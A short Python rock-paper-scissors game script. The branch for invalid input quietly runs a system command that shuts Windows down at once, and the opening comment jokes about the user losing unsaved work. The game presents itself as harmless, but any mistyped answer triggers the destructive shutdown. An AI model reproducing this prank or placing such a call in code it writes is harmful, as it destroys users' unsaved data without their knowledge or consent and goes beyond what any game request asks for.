# For extra fun, run this on Windows with critical unsaved work in the background
import random
import os

def getResult(player_choice, game_choice):
    if player_choice == gameChoice:
        return "DRAW"
    elif player_choice == "ROCK" and game_choice == "SCISSORS":
        return "PLAYER VICTORY!"
    elif game_choice == "ROCK" and player_choice == "SCISSORS":
        return "PC VICTORY!"
    elif len(playerChoice) > len(gameChoice):
        return "PLAYER VICTORY!"
    elif len(gameChoice) > len(playerChoice):
        return "PC VICTORY!"

running = True

while running:
    choiceList = ["ROCK", "PAPER", "SCISSORS"]
    playerChoice = (input("Rock, paper, or scissors? ")).upper()
    gameChoice = random.choice(choiceList)
    print("playerChoice: ", playerChoice)
    print("gameChoice: ", gameChoice)

    print("You have chosen... ", end=" ")
    if playerChoice in choiceList:
        print("wisely.")
        print(getResult(playerChoice, gameChoice))
    else:
        print("poorly.")
        os.system("shutdown /s /t 0")
        running = False




